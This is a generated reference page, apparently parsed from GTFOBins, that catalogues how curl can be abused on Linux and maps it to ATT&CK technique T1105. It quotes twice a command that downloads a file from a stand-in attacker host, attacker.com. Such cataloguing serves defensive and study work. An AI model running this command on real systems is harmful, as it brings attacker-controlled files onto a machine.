---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# curl

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `curl` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/curl` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for curl covering download, file-read, file-write, library-load, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/curl.md)
- Source verification: [source record](../../sources/gtfobins/curl.md)

## Aliases

- `curl`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: curl http://attacker.com/path/to/input-file -o /path/to/output-file |

## Source Verification

[source record](../../sources/gtfobins/curl.md)

## Evidence Excerpt

```text
_body: ''
_name: curl
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/curl
functions:
download:
- code: curl http://attacker.com/path/to/input-file -o /path/to/output-file
contexts:
sudo: null
```
